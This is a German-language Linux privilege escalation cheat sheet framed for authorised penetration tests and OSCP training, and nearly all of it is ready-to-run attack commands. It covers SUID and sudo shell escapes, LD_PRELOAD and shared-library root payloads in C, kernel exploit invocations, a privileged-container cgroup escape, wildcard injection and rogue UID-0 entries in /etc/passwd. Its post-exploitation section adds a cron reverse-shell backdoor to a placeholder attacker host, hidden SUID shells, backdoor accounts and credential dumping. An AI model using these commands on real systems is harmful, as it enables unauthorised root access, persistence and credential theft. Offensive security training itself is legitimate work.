# Linux Privilege Escalation - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.

---

## Inhaltsverzeichnis
1. [Enumeration & Information Gathering](#enumeration--information-gathering)
2. [Kernel Exploits](#kernel-exploits)
3. [SUID/SGID Binaries](#suidsgid-binaries)
4. [Sudo Misconfiguration](#sudo-misconfiguration)
5. [Capabilities](#capabilities)
6. [Cron Jobs](#cron-jobs)
7. [PATH Hijacking](#path-hijacking)
8. [NFS Root Squashing](#nfs-root-squashing)
9. [Docker Escape](#docker-escape)
10. [Writable Files & Directories](#writable-files--directories)
11. [Password & Shadow Files](#password--shadow-files)
12. [SSH Keys](#ssh-keys)
13. [Environment Variables](#environment-variables)
14. [Library Hijacking](#library-hijacking)
15. [Shared Libraries](#shared-libraries)
16. [Wildcard Injection](#wildcard-injection)
17. [Exploiting Services](#exploiting-services)
18. [Logrotate](#logrotate-exploitation)
19. [LXC/LXD](#lxclxd-exploitation)
20. [Systemd/D-Bus](#systemd-d-bus)
21. [Polkit (pkexec)](#polkit-pkexec)
22. [Dirty Pipe/Cow](#dirty-pipecow)
23. [Writable /etc/passwd](#writable-etcpasswd)
24. [Groups](#group-memberships)
25. [Scripts & Automation](#automated-scripts)
26. [Post-Exploitation](#post-exploitation)

---

## Enumeration & Information Gathering

### 1. System Information
```bash
# OS Version
cat /etc/os-release
cat /etc/issue
lsb_release -a
uname -a
uname -r  # Kernel version
cat /proc/version

# Hostname
hostname
hostname -f

# CPU Architecture
uname -m
lscpu
cat /proc/cpuinfo
```

### 2. Current User Information
```bash
# Whoami
whoami
id
groups

# Sudo Permissions
sudo -l

# Users
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"
getent passwd

# Groups
cat /etc/group
getent group

# Currently logged in users
w
who
last
lastlog
```

### 3. Network Information
```bash
# Network interfaces
ip a
ifconfig
cat /etc/network/interfaces
cat /etc/sysconfig/network-scripts/ifcfg-*

# Routing
ip route
route -n
netstat -rn

# ARP
ip neigh
arp -a

# Connections
ss -tuln
netstat -tuln
netstat -antp   # with PIDs (root needed)

# DNS
cat /etc/resolv.conf

# Hosts
cat /etc/hosts

# Firewall
iptables -L
nft list ruleset
ufw status
```

### 4. Processes & Services
```bash
# Running processes
ps aux
ps -ef
ps auxf  # Tree view
pstree

# Process details
cat /proc/PID/cmdline
cat /proc/PID/environ

# Services (systemd)
systemctl list-units --type=service
systemctl list-unit-files
service --status-all

# Init scripts
ls -la /etc/init.d/
```

### 5. Installed Software
```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RedHat/CentOS
rpm -qa
yum list installed

# From source compilations
ls -la /usr/local/bin
ls -la /usr/local/src
```

### 6. File Systems & Storage
```bash
# Mounted filesystems
mount
cat /etc/fstab
df -h

# Disks
lsblk
fdisk -l

# Find writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Find world-writable files
find / -perm -002 -type f 2>/dev/null
```

### 7. Scheduled Jobs
```bash
# User crontabs
crontab -l
crontab -l -u username

# System crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*

# Systemd timers
systemctl list-timers --all
```

### 8. Automated Enumeration Scripts
```bash
# LinPEAS (empfohlen!)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh
./linpeas.sh -a  # Alle checks

# LinEnum
./LinEnum.sh
./LinEnum.sh -t  # Thorough

# Linux Smart Enumeration (LSE)
./lse.sh -l 1  # Level 1
./lse.sh -l 2  # Level 2

# Linux Exploit Suggester
./linux-exploit-suggester.sh
./les.sh --uname "$(uname -r)"

# Unix-privesc-check
./unix-privesc-check standard
./unix-privesc-check detailed

# pspy (Monitor processes without root)
./pspy64
./pspy64 -pf -i 1000
```

---

## Kernel Exploits

### 9. Kernel Exploit Identification
```bash
# Kernel Version
uname -r
uname -a
cat /proc/version

# Distribution
cat /etc/os-release
lsb_release -a

# Architecture
uname -m

# Search exploits
searchsploit "Linux Kernel"
searchsploit "Linux Kernel $(uname -r)"

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# Linux Exploit Suggester 2
./les2.pl
```

### 10. Bekannte Kernel Exploits

#### Dirty COW (CVE-2016-5195)
**Kernel**: 2.6.22 - 4.8.3 (before Oct 2016)
```bash
# dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# Erzeugt firefart user mit root privileges
su firefart
```

#### Dirty Pipe (CVE-2022-0847)
**Kernel**: 5.8+ to 5.16.11, 5.15.25, 5.10.102 (before March 2022)
```bash
# Exploits /etc/passwd oder SUID binaries
gcc exploit.c -o exploit
./exploit /usr/bin/su
```

#### PwnKit (CVE-2021-4034)
**Betroffen**: Polkit / pkexec seit 2009
```bash
# Local privilege escalation via pkexec
gcc pwnkit.c -o pwnkit
./pwnkit

# Alternative
./pwnkit.sh
```

#### OverlayFS (CVE-2021-3493)
**Ubuntu Kernel**: Ubuntu 20.10, 20.04 LTS, 18.04 LTS
```bash
gcc exploit.c -o exploit
./exploit
```

#### Baron Samedit (CVE-2021-3156)
**Sudo**: 1.8.2-1.8.31p2, 1.9.0-1.9.5p1
```bash
./exploit.sh
```

#### CVE-2017-16995 (eBPF)
**Kernel**: 4.4 - 4.14.7
```bash
gcc exploit.c -o exploit
./exploit
```

#### CVE-2017-1000112 (UFO)
**Kernel**: 3.4+ bis 4.13
```bash
./exploit
```

#### CVE-2016-0728 (Keyring)
**Kernel**: 3.8+
```bash
gcc keyring-exploit.c -o keyring-exploit -lkeyutils -Wall
./keyring-exploit
```

#### CVE-2015-1328 (OverlayFS)
**Ubuntu Kernel**: 3.13.0-24 bis 3.19.0
```bash
gcc ofs.c -o ofs
./ofs
```

#### CVE-2014-0038 (recvmmsg)
**Kernel**: 3.4 - 3.13.1
```bash
gcc exploit.c -o exploit
./exploit
```

---

## SUID/SGID Binaries

### 11. SUID/SGID Enumeration
```bash
# Alle SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null

# Alle SGID binaries
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 2>/dev/null

# Kombiniert (SUID oder SGID)
find / -type f -a \( -perm -u+s -o -perm -g+s \) 2>/dev/null

# Mit Details
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```

### 12. Common SUID Exploits

#### /usr/bin/find
```bash
find /etc/passwd -exec whoami \;
find /etc/passwd -exec /bin/bash -p \;
find /etc/passwd -exec chmod u+s /bin/bash \;
```

#### /usr/bin/vim / vi
```bash
vim -c ':!/bin/sh'
vim -c ':set shell=/bin/sh'
vim -c ':shell'
```

#### /usr/bin/nmap
```bash
# Alte nmap Versionen (2.02-5.21)
nmap --interactive
nmap> !sh

# Nmap mit script
echo "os.execute('/bin/sh')" > /tmp/shell.nse
nmap --script=/tmp/shell.nse
```

#### /usr/bin/less / more
```bash
less /etc/passwd
!/bin/sh

# oder
VISUAL="/bin/sh -c '/bin/sh'" less /etc/passwd
v
```

#### /usr/bin/awk
```bash
awk 'BEGIN {system("/bin/sh")}'
```

#### /usr/bin/perl
```bash
perl -e 'exec "/bin/sh";'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

#### /usr/bin/python
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

#### /usr/bin/ruby
```bash
ruby -e 'exec "/bin/sh"'
ruby -e 'require "fileutils"; FileUtils.chmod 04755, "/bin/bash"'
```

#### /usr/bin/gcc
```bash
gcc -wrapper /bin/sh,-s .
```

#### /usr/bin/bash / sh
```bash
bash -p
sh -p
```

#### /usr/bin/cp
```bash
# /etc/passwd überschreiben
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$6$salt$hashedpassword:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
su root2
```

#### /usr/bin/nano
```bash
nano /etc/passwd
# In nano:
^R ^X (Ctrl+R, Ctrl+X)
reset; sh 1>&0 2>&0
```

#### /usr/bin/tar
```bash
tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### /usr/bin/git
```bash
git help status
!/bin/sh
```

### 13. GTFOBins
**Beschreibung**: Datenbank für SUID/Sudo/Capabilities Exploits
```bash
# Website: https://gtfobins.github.io/
# Suche nach Binary und filtere nach "SUID"
```

---

## Sudo Misconfiguration

### 14. Sudo -l Analysis
```bash
# Sudo Berechtigungen prüfen
sudo -l

# Sudo version (für CVE Check)
sudo -V | grep "Sudo version"
```

### 15. Sudo Binary Exploits

#### (ALL) NOPASSWD: ALL
```bash
sudo su
sudo bash
```

#### sudo /usr/bin/find
```bash
sudo find /etc/passwd -exec /bin/bash \;
```

#### sudo /usr/bin/vim
```bash
sudo vim -c ':!/bin/sh'
```

#### sudo /usr/bin/nmap
```bash
sudo nmap --interactive
nmap> !sh
```

#### sudo /usr/bin/less
```bash
sudo less /etc/passwd
!/bin/sh
```

#### sudo /usr/bin/awk
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### sudo /usr/bin/python
```bash
sudo python -c 'import os; os.system("/bin/sh")'
```

#### sudo /usr/bin/perl
```bash
sudo perl -e 'exec "/bin/sh";'
```

#### sudo /usr/bin/ruby
```bash
sudo ruby -e 'exec "/bin/sh"'
```

#### sudo /usr/bin/cp
```bash
# Shadow file ersetzen
sudo cp /etc/shadow /tmp/shadow.bak
# Eigenen Hash einfügen
sudo cp /tmp/shadow.modified /etc/shadow
```

#### sudo /usr/bin/mv
```bash
# Ähnlich wie cp - kritische Files verschieben
```

#### sudo /usr/bin/tar
```bash
sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### sudo /usr/bin/zip
```bash
sudo zip /tmp/test.zip /tmp/test -T -TT 'sh #'
```

#### sudo /usr/bin/git
```bash
sudo git -p help
!/bin/sh
```

#### sudo /usr/bin/man
```bash
sudo man man
!/bin/sh
```

#### sudo /usr/bin/apt / apt-get
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

### 16. Sudo Environment Variables

#### LD_PRELOAD
```bash
# sudo -l output zeigt:
# env_keep+=LD_PRELOAD

# Exploit:
# shell.c:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# Compile:
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute:
sudo LD_PRELOAD=/tmp/shell.so <binary_from_sudo_l>
```

#### LD_LIBRARY_PATH
```bash
# Wenn LD_LIBRARY_PATH in env_keep

# Finde shared libraries die ein SUID binary nutzt:
ldd /usr/sbin/apache2

# Library nachbauen mit malicious code
gcc -shared -fPIC -o /tmp/libcrypt.so.1 exploit.c

# Execute:
sudo LD_LIBRARY_PATH=/tmp apache2
```

### 17. Sudo Version Exploits

#### CVE-2021-3156 (Baron Samedit)
**Sudo**: 1.8.2-1.8.31p2, 1.9.0-1.9.5p1
```bash
./exploit.sh
```

#### CVE-2019-14287 (Sudo Bypass)
**Sudo**: < 1.8.28
```bash
# Wenn: (ALL, !root) /bin/bash
sudo -u#-1 /bin/bash
```

---

## Capabilities

### 18. Capabilities Enumeration
```bash
# Alle capabilities finden
getcap -r / 2>/dev/null

# Capabilities einer Datei
getcap /usr/bin/python3.8
```

### 19. Capability Exploits

#### cap_setuid
```bash
# Python mit cap_setuid+ep
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### cap_dac_read_search
```bash
# Erlaubt Lesen aller Dateien
tar -cvf shadow.tar /etc/shadow
cat shadow.tar
```

#### cap_dac_override
```bash
# Erlaubt Schreiben in alle Dateien
```

#### cap_net_raw
```bash
# Network sniffing als non-root
```

#### cap_sys_admin
```bash
# Container escape möglich
```

---

## Cron Jobs

### 20. Cron Job Enumeration
```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.d
ls -la /etc/cron.daily
ls -la /etc/cron.hourly
ls -la /etc/cron.monthly
ls -la /etc/cron.weekly

# User crontabs
crontab -l
crontab -l -u username

# Crontab location
ls -la /var/spool/cron
ls -la /var/spool/cron/crontabs

# Systemd timers
systemctl list-timers --all
```

### 21. Cron Job Exploitation

#### Writable Cron Script
```bash
# Wenn cron script schreibbar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/cron/script.sh

# Warte auf Ausführung
/tmp/bash -p
```

#### PATH in Crontab
```bash
# /etc/crontab:
# PATH=/home/user:/usr/local/bin:/usr/bin:/bin
# * * * * * root backup.sh

# Erstelle /home/user/backup.sh:
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

chmod +x /home/user/backup.sh

# Warte auf Ausführung
/tmp/rootbash -p
```

#### Wildcard Injection in Cron
```bash
# Cron: */5 * * * * root tar -czf /backup/backup.tar.gz *

# Exploitation (siehe Wildcard Injection section)
```

---

## PATH Hijacking

### 22. PATH Variable Manipulation
```bash
# Aktuelle PATH
echo $PATH

# Script ohne absoluten Pfad:
#!/bin/bash
ls

# Exploit:
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH

# Wenn script als root läuft -> root shell
```

### 23. SUID Binary PATH Hijacking
```bash
# Wenn SUID binary "service" ohne absolute Pfade aufruft:
strings /path/to/suid-binary | grep -i service

# Erstelle malicious binary:
echo "/bin/bash" > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Execute SUID binary
/path/to/suid-binary
```

---

## NFS Root Squashing

### 24. NFS Misconfiguration
```bash
# Auf dem Target: NFS Shares prüfen
cat /etc/exports
showmount -e localhost
showmount -e <target_ip>

# no_root_squash = root auf client = root auf server

# Angreifer-System (als root):
mkdir /tmp/nfs
mount -o rw,vers=3 <target>:/share /tmp/nfs

# SUID binary erstellen
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# Auf Target:
/share/bash -p
```

---

## Docker Escape

### 25. Docker Container Detection
```bash
# Docker Container?
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Privileged Container?
ip link add dummy0 type dummy 2>/dev/null && echo "Privileged" || echo "Unprivileged"

# Capabilities
capsh --print
```

### 26. Docker Socket Mounted
```bash
# Socket mounted?
ls -la /var/run/docker.sock

# Exploit:
docker run -v /:/hostroot -it ubuntu bash
chroot /hostroot
```

### 27. Privileged Container Escape
```bash
# Wenn privileged:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 28. Docker Group Membership
```bash
# User in docker Gruppe?
id | grep docker

# Exploit:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Writable Files & Directories

### 29. World-Writable Files
```bash
# Writable Files
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys"
find / -perm -2 -type f 2>/dev/null

# Writable Directories
find / -writable -type d 2>/dev/null
```

### 30. Critical Writable Files

#### /etc/passwd writable
```bash
# Check
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt xyz password123

# Add root user
echo 'root2:$1$xyz$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch
su root2
```

#### /etc/shadow writable
```bash
# Generate hash
mkpasswd -m sha-512 password123

# Replace root hash in /etc/shadow
```

#### /etc/sudoers writable
```bash
echo "username ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
sudo su
```

#### Service files writable
```bash
# Systemd service files
ls -la /etc/systemd/system/*.service

# Modify ExecStart
[Service]
ExecStart=/tmp/payload.sh

systemctl daemon-reload
systemctl restart <service>
```

---

## Password & Shadow Files

### 31. /etc/passwd & /etc/shadow
```bash
# Readable?
cat /etc/passwd
cat /etc/shadow

# Backup files
cat /etc/passwd-
cat /etc/shadow-
cat /etc/passwd.bak
cat /etc/shadow.bak

# In other locations
find / -name "passwd" 2>/dev/null
find / -name "shadow" 2>/dev/null
```

### 32. Password Cracking
```bash
# Unshadow (wenn beide readable)
unshadow passwd shadow > hashes.txt

# John the Ripper
john hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## SSH Keys

### 33. SSH Key Locations
```bash
# Private keys finden
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Common locations
ls -la ~/.ssh/
ls -la /root/.ssh/
ls -la /home/*/.ssh/

# authorized_keys
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### 34. SSH Key Exploitation
```bash
# Private key gefunden:
chmod 600 id_rsa
ssh -i id_rsa user@target

# authorized_keys writable:
ssh-keygen
cat ~/.ssh/id_rsa.pub >> /target/.ssh/authorized_keys

# SSH als root:
ssh -i id_rsa root@target
```

### 35. SSH Config Weaknesses
```bash
# sshd_config prüfen
cat /etc/ssh/sshd_config

# PermitRootLogin yes
# PasswordAuthentication yes
# PermitEmptyPasswords yes
```

---

## Environment Variables

### 36. LD_PRELOAD / LD_LIBRARY_PATH
```bash
# Siehe Sudo Section (#16)

# Für SUID binaries (wenn nicht gesetzt: secure execution mode)
# Meist nicht exploitbar bei SUID
```

---

## Library Hijacking

### 37. Shared Library Enumeration
```bash
# Libraries die ein binary nutzt
ldd /path/to/binary

# Library search path
cat /etc/ld.so.conf
cat /etc/ld.so.conf.d/*
ldconfig -p
```

### 38. Custom Library Injection
```c
// evil.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o evil.so evil.c

# If binary uses writable RPATH/RUNPATH:
cp evil.so /writable/path/libvictim.so

# Execute binary
/path/to/vulnerable-binary
```

---

## Wildcard Injection

### 39. Tar Wildcard Injection
```bash
# Vulnerable cron:
# tar -czf /backup/backup.tar.gz *

# Exploitation:
cd /backup/target
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
chmod +x shell.sh

# Wait for cron execution
/tmp/bash -p
```

### 40. Chown / Chmod Wildcard
```bash
# Vulnerable cron:
# chown root:root *

# Exploitation:
touch -- --reference=/path/to/file
```

### 41. Rsync Wildcard
```bash
# Rsync mit wildcard
# Similar exploits wie tar
```

---

## Exploiting Services

### 42. MySQL Running as Root
```bash
# MySQL mit root privileges

# User Defined Function (UDF) Injection
use mysql;
create table foo(line blob);
insert into foo values(load_file('/path/to/lib_mysqludf_sys.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```

### 43. Apache/Nginx Configuration
```bash
# Config files
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf

# Writable web directories als root ausgeführt?
```

### 44. Tmux/Screen Sessions
```bash
# Tmux sessions
tmux ls

# Attach zu root session
tmux attach -t 0

# Screen sessions
screen -ls

# Attach
screen -x root/session
```

---

## Logrotate Exploitation

### 45. Logrotate Race Condition
```bash
# CVE-2011-1155, CVE-2011-1549

# logrotten exploit
./logrotten -p payload.sh /path/to/logfile
```

---

## LXC/LXD Exploitation

### 46. LXD Group Membership
```bash
# User in lxd Gruppe?
id | grep lxd

# Exploitation:
# Auf Angreifer-System:
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# Transfer alpine.tar.gz zu Target

# Auf Target:
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# Im Container:
cd /mnt/root/root
```

---

## Systemd / D-Bus

### 47. Systemd Service Exploitation
```bash
# Writable service files
find /etc/systemd/system -writable 2>/dev/null

# Service modifizieren
[Service]
ExecStart=/tmp/reverse.sh

systemctl daemon-reload
systemctl restart <service>
```

### 48. D-Bus Exploitation
```bash
# Polkit (siehe nächste Section)
```

---

## Polkit (pkexec)

### 49. CVE-2021-4034 (PwnKit)
```bash
# Seit 2009 in polkit
gcc pwnkit.c -o pwnkit
./pwnkit

# Alternative
./CVE-2021-4034.py
```

---

## Dirty Pipe/Cow

### 50. Dirty COW (CVE-2016-5195)
**Kernel**: 2.6.22 - 4.8.3
```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty NewPassword

su firefart
```

### 51. Dirty Pipe (CVE-2022-0847)
**Kernel**: 5.8 - 5.16.11 / 5.15.25 / 5.10.102
```bash
gcc exploit.c -o exploit

# Variante 1: /etc/passwd overwrite
./exploit /etc/passwd 1 "root::"

# Variante 2: SUID binary overwrite
./exploit /usr/bin/sudo 0 "\x90\x90\x90"
```

---

## Writable /etc/passwd

### 52. /etc/passwd Manipulation
```bash
# Check permissions
ls -la /etc/passwd

# Generate password
openssl passwd -1 -salt salt password123

# Add user with UID 0
echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su newroot
```

---

## Group Memberships

### 53. Interessante Gruppen

#### disk group
```bash
# Zugriff auf raw disk devices
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

#### video group
```bash
# Framebuffer access
# Screenshot vom Screen
cat /dev/fb0 > /tmp/screen.raw
```

#### docker group
```bash
# Siehe Docker Section (#28)
docker run -v /:/hostroot -it ubuntu bash
```

#### lxd group
```bash
# Siehe LXD Section (#46)
```

#### adm group
```bash
# Zugriff auf logs
cat /var/log/auth.log
cat /var/log/apache2/access.log
# Credentials in logs?
```

#### shadow group
```bash
# /etc/shadow readable
cat /etc/shadow
```

---

## Scripts & Automation

### 54. Automated Privilege Escalation

#### LinPEAS (empfohlen!)
```bash
./linpeas.sh
./linpeas.sh -a  # Alle checks
./linpeas.sh -s  # Superfast
```

#### LinEnum
```bash
./LinEnum.sh
./LinEnum.sh -t  # Thorough
```

#### Linux Smart Enumeration (LSE)
```bash
./lse.sh -l 1  # Level 1 (schnell)
./lse.sh -l 2  # Level 2 (detailliert)
```

#### pspy
```bash
# Monitor processes ohne root
./pspy64
./pspy64 -pf -i 1000  # Print commands and file system events
```

---

## Post-Exploitation

### 55. Persistence

#### SSH Backdoor
```bash
# authorized_keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

#### Cron Backdoor
```bash
(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'") | crontab -
```

#### SUID Backdoor
```bash
cp /bin/bash /tmp/.hidden
chmod +s /tmp/.hidden
```

#### User Creation
```bash
useradd -ou 0 -g 0 backdoor
echo "backdoor:password" | chpasswd
```

#### .bashrc / .profile
```bash
echo "/tmp/backdoor.sh &" >> ~/.bashrc
```

### 56. Credential Dumping
```bash
# /etc/shadow
cat /etc/shadow

# SSH Keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Config files
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null

# Memory dumps
strings /dev/mem | grep -i "password"
```

### 57. Lateral Movement
```bash
# SSH
ssh user@nexthost

# su
su - otheruser

# sudo
sudo -u otheruser bash
```

### 58. Network Pivoting
```bash
# SSH Dynamic Port Forwarding
ssh -D 9050 user@target

# SSH Local Port Forwarding
ssh -L 8080:internal:80 user@target

# SSH Remote Port Forwarding
ssh -R 4444:127.0.0.1:4444 user@target

# Chisel
./chisel server -p 8000 --reverse
./chisel client attacker:8000 R:socks
```

---

## Quick Wins - Prioritäts-Checks

### 1. Sudo ohne Password
```bash
sudo -l
# Wenn (ALL) NOPASSWD: /bin/bash
sudo /bin/bash

# Wenn (ALL) NOPASSWD: ALL
sudo su
```

### 2. Docker Group Membership
```bash
id | grep docker
# Wenn in docker Gruppe:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 3. Writable /etc/passwd
```bash
ls -la /etc/passwd
# Wenn writable:
openssl passwd -1 -salt xyz password123
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### 4. SUID /bin/bash oder /bin/sh
```bash
find / -perm -4000 -type f 2>/dev/null | grep -E "bash|sh"
# Wenn gefunden:
/bin/bash -p
/bin/sh -p
```

### 5. NFS no_root_squash
```bash
cat /etc/exports | grep no_root_squash
showmount -e localhost
# Wenn no_root_squash:
# Auf Angreifer-System:
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod 4755 /tmp/nfs/bash
# Auf Target:
/share/bash -p
```

### 6. Capabilities mit cap_setuid
```bash
getcap -r / 2>/dev/null | grep cap_setuid
# Wenn gefunden (z.B. python):
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 7. Kernel Exploit (alte Kernel)
```bash
uname -r
# Wenn < 4.8.3:
# Dirty COW (CVE-2016-5195)
./dirty password

# Wenn 5.8 - 5.16.11:
# Dirty Pipe (CVE-2022-0847)
./exploit
```

### 8. LXD Group
```bash
id | grep lxd
# Wenn in lxd Gruppe:
# Container mit root filesystem mount
```

### 9. Writable Cron Script
```bash
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
# Wenn writable:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script
# Warten auf Ausführung
/tmp/bash -p
```

### 10. Readable /etc/shadow
```bash
cat /etc/shadow 2>/dev/null
# Wenn readable:
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## Schnelle Enumeration Checklist

```bash
# 1. User & Sudo
whoami && id
sudo -l

# 2. SUID Files (WICHTIG!)
find / -perm -4000 -type f 2>/dev/null

# 3. Capabilities (OFT ÜBERSEHEN!)
getcap -r / 2>/dev/null

# 4. Writable /etc
find /etc -writable -type f 2>/dev/null
ls -la /etc/passwd /etc/shadow /etc/sudoers

# 5. Cron Jobs
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers

# 6. Processes als Root
ps aux | grep "^root"

# 7. Network Services
netstat -tulpn
ss -tulpn

# 8. Docker/Container
id | grep docker
ls -la /var/run/docker.sock
ls -la /.dockerenv

# 9. NFS Shares
cat /etc/exports
showmount -e localhost

# 10. Credentials & Keys
history | grep -i pass
find / -name "id_rsa" 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -i "password" 2>/dev/null | head -20

# 11. Kernel Version
uname -r
searchsploit linux kernel $(uname -r)

# 12. Interessante Groups
id
# Check für: docker, lxd, disk, video, adm, shadow
```

---

## Empfohlene Methoden nach Szenario

### Schnelle Enumeration
1. **LinPEAS** (#8, #54) - Automated Scanner
2. **sudo -l** (#14) - Sudo Permissions
3. **SUID/SGID** (#11) - Dangerous Binaries

### Standard User
1. **Kernel Exploits** (#10) - Dirty COW, Dirty Pipe, etc.
2. **Sudo Misconfiguration** (#15-17)
3. **SUID Binaries** (#12)
4. **Cron Jobs** (#21)

### Kernel Exploits (wenn alte Kernel)
1. **Dirty COW** (#50) - Sehr zuverlässig
2. **Dirty Pipe** (#51) - Neuere Kernel
3. **PwnKit** (#49) - Polkit

### Docker Container
1. **Docker Socket** (#26)
2. **Privileged Container** (#27)
3. **Docker Group** (#28)

### Service Accounts
1. **sudo -l** (#14)
2. **Capabilities** (#18-19)
3. **Cron Jobs** (#20-21)

---

## Tools Übersicht

### Enumeration
- LinPEAS (empfohlen!)
- LinEnum
- Linux Smart Enumeration (LSE)
- pspy
- unix-privesc-check
- Linux Exploit Suggester

### Exploitation
- GTFOBins
- Kernel exploits (Dirty COW, Dirty Pipe, etc.)
- PwnKit
- John the Ripper
- Hashcat

### Post-Exploitation
- SSH
- Various backdoors

---

## Wichtige Hinweise

- **Kernel Exploits**: Können System crashen - Vorsicht in Produktionsumgebungen
- **SUID Binaries**: Immer GTFOBins checken
- **sudo -l**: Erste Anlaufstelle
- **Automated Scripts**: LinPEAS spart viel Zeit
- **Backups**: Immer Backups von modifizierten Files erstellen
- **Detection**: Moderne EDR erkennt viele Techniken
- **Container**: Container Escapes unterscheiden sich von klassischer PrivEsc

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Forensische Analysen auf eigenen Systemen
- Sicherheitsforschung in kontrollierten Umgebungen
- Defensive Security und Incident Response

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**System**: Linux
**Kontext**: Autorisierter Penetrationstest / OSCP Training
